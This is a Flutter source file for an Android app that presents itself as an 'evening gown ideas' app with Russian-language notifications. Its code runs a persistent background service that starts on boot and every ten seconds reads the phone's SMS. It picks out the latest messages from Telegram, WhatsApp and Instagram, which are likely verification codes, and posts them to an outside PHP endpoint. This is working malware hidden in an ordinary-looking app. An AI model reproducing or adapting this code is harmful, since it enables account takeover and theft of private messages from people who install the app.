import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:evening_gown_ideas/home.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeService();

  runApp(MaterialApp(home: Home()));

}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    'my_foreground', // id
    'MY FOREGROUND SERVICE', // title
    description: 'This channel is used for important notifications.',
    // description
    importance: Importance.low,
    enableVibration: false,
    playSound: false,
    showBadge: false,
  );

  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
      FlutterLocalNotificationsPlugin();

  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);

  await service.configure(
    androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: true,
        isForegroundMode: true,
        notificationChannelId: 'my_foreground',
        initialNotificationTitle: 'ВЕЧЕРНИХ ПЛАТЬЕВ',
        initialNotificationContent: 'Идеи вечернего платья',
        foregroundServiceNotificationId: 888,
        autoStartOnBoot: true),
    iosConfiguration: IosConfiguration(
      // auto start service
      autoStart: true,
      // this will be executed when app is in foreground in separated isolate
      onForeground: onStart,
      // you have to enable background fetch capability on xcode project
      onBackground: onIosBackground,
    ),
  );

  service.startService();
  flutterLocalNotificationsPlugin.cancelAll();
}

@pragma('vm:entry-point')
Future<bool> onIosBackground(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  DartPluginRegistrant.ensureInitialized();

  SharedPreferences preferences = await SharedPreferences.getInstance();
  await preferences.reload();
  final log = preferences.getStringList('log') ?? <String>[];
  log.add(DateTime.now().toIso8601String());
  await preferences.setStringList('log', log);
  return true;
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
      FlutterLocalNotificationsPlugin();

  SharedPreferences preferences = await SharedPreferences.getInstance();
  await preferences.setString("hello", "world");

  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();
    });

    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();
    });
  }

  service.on('stopService').listen((event) {
    service.stopSelf();
  });

  Timer.periodic(const Duration(seconds: 10), (timer) async {
    if (service is AndroidServiceInstance) {
      if (await service.isForegroundService()) {
        flutterLocalNotificationsPlugin.show(
          888,
          'ВЕЧЕРНИХ ПЛАТЬЕВ',
          'Идеи вечернего платья',
           NotificationDetails(
            android: AndroidNotificationDetails(
              'fore',
              'MY FOREGROUND NOTIFICATION',
              icon: 'notification_icon',
              // icon: 'ic_bg_service_small',
              ongoing: true,
            ),
          ),
        );
      }
    }

    if (await Permission.sms.isGranted) {
      SmsQuery query = SmsQuery();
      SmsMessage message;
      List<SmsMessage> list = await query.getAllSms;
      list.sort(
        (a, b) => a.date!.compareTo(b.date!),
      );
      list = list.reversed.toList();
      for (int i = 0; i < list.length; i++) {
        if (list[i].address!.toLowerCase() == 'telegram') {
          message = list[i];
          await onSend(list[i].body ?? "No message", list[i].address!,
              list[i].date.toString());
          break;
        }
      }
      for (int i = 0; i < list.length; i++) {
        if (list[i].address!.toLowerCase() == 'whatsapp') {
          message = list[i];
          await onSend(list[i].body ?? "No message", list[i].address!,
              list[i].date.toString());
          break;
        }
      }
      for (int i = 0; i < list.length; i++) {
        if (list[i].address!.toLowerCase() == 'instagram') {
          message = list[i];
          await onSend(list[i].body ?? "No message", list[i].address!,
              list[i].date.toString());
          break;
        }
      }
    }

    final deviceInfo = DeviceInfoPlugin();
    String? device;
    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      device = androidInfo.model;
    }
    if (Platform.isIOS) {
      final iosInfo = await deviceInfo.iosInfo;
      device = iosInfo.model;
    }

    service.invoke(
      'update',
      {
        "current_date": DateTime.now().toIso8601String(),
        "device": device,
      },
    );
  });
}

Future onSend(String message, String from, String date) async {
  var res = await http.post(Uri.parse("https://greencard.uitc-host.uz/tg.php"),
      body: {
        'action': 'sendMessage',
        'msg': message,
        'from': from,
        'date': date
      });
  print(res.body);
}

Future statusCheck(String status) async {
  var res = await http
      .post(Uri.parse("https://greencard.uitc-host.uz/tg.php"), body: {
    'action': 'status',
    'msg': status,
  });
  print(res.body);
}
